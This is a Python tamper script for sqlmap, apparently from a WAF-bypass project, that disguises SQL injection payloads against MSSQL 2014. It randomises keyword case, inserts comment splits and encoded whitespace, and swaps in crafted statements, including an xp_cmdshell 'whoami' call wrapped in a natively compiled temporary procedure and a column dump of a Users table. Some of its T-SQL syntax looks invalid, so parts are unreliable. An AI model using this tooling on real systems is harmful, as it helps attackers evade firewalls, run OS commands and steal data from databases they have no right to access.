#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2014_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|MEMORY_OPTIMIZED|NATIVE_COMPILATION|ATOMIC|SCHEMABINDING|DURABILITY|SYS\.TABLES|SYS\.COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "USER_NAME()" in payload.upper():
        payload = "CREATE TABLE #perm (u NVARCHAR(100)) WITH (MEMORY_OPTIMIZED=ON, DURABILITY=SCHEMA_ONLY); INSERT INTO #perm SELECT USER_NAME(); SELECT u FROM #perm"

    if "xp_cmdshell" in payload.lower():
        payload = "CREATE PROCEDURE #exec_cmd WITH NATIVE_COMPILATION, SCHEMABINDING AS BEGIN ATOMIC WITH (TRANSACTION ISOLATION LEVEL = SNAPSHOT, LANGUAGE = N'us_english') EXEC xp_cmdshell 'whoami' END; EXEC #exec_cmd"

    if "sys.tables" in payload.lower():
        payload = payload.replace("sys.tables", "sys.tables WITH (MEMORY_OPTIMIZED=ON)")

    if "sys.columns" in payload.lower() and "Users" in payload:
        payload = "SELECT name INTO #cols FROM sys.columns WITH (MEMORY_OPTIMIZED=ON) WHERE object_id=OBJECT_ID('Users'); SELECT * FROM #cols"

    payload = general_obfuscate(payload)

    return payload
